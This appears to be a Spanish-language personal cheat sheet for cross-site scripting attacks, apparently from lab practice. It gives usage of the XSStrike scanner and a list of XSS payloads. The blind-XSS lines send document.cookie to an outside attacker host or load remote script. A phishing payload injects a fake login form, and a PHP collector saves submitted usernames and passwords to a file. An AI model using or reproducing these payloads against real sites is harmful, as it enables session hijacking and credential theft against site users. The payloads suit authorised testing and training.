Tomar en cuenta que algunas veces vamos a tener que ver el codigo para personalizar nuestro payload porque algunas veces se tendra que romper comillas o cerrar tags del mismo codigo para que funcione nuestro payload

Tambi`en tomar ojo en el network de la misma pagina porque el payload tal vez se envia en un post o un get que no es del boton que estamos ejecutando

# Automated tools
```
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```

# Repositories
[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
[Payload-Box](https://github.com/payload-box/xss-payload-list)

# Common XSS
Tomar en cuenta que cuando el js usa innerhtml los tags <script> no funcionan porque existe una purificacion
```
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(document.cookie)>

# Blind
<img+src="http://10.10.14.73/service"+onerror=fetch("http://10.10.14.73/?c="+document.cookie)+/>
<script src=http://10.10.14.236></script>
'><script src=http://10.10.14.236></script>
"><script src=http://10.10.14.236></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.14.236\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.14.236");a.send();</script>
<script>$.getScript("http://10.10.14.236")</script>
<script>document.location='http://10.10.14.236/XSS/grabber.php?c='+document.cookie</script>
```
- Recepcion de peticion xss blind
```
var request = new XMLHttpRequest();
request.open('GET', 'http://10.10.14.73/?cookie=' + document.cookie, false);
request.send();
```

# Pishing 
Payload
```
'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.236><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```
index.php
```
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
